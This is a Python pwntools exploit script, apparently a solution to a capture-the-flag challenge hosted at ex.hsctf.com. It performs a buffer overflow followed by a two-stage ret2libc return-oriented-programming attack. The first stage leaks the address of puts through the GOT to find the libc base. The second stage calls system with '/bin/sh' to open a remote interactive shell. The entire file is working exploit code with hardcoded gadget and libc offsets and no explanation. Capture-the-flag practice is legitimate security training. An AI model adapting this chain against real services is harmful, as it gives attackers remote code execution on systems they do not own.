from pwn import *

#context.log_level = 'debug'

payload = b'Q' 
payload += b"\00"
payload += b"A"*38
payload += p64(0x00000000004014f3) #poprdi
payload += p64(0x404028) #got
payload += p64(0x0000000000401100) #plt
payload += p64(0x0000000000401276) #main

#p = process("./ex")
p = remote("ex.hsctf.com", 1337)
p.sendline(payload)

puts_leak = u64(p.recv(6) + b'\x00\x00')
print(hex(puts_leak))

libc_address = puts_leak - 0x084420
log.success(f'LIBC base: {hex(libc_address)}')

payload2 = b'Q'
payload2 += b"\00"
payload2 += b"A"*38
payload2 += p64(0x000000000040101a) #ret
payload2 += p64(0x00000000004014f3) #poprdi
payload2 += p64(libc_address+0x1b45bd) #binsh
payload2 += p64(libc_address+0x052290) #system
#payload2 += p64(0x0)

p.sendline(payload2)
p.clean()
p.interactive()
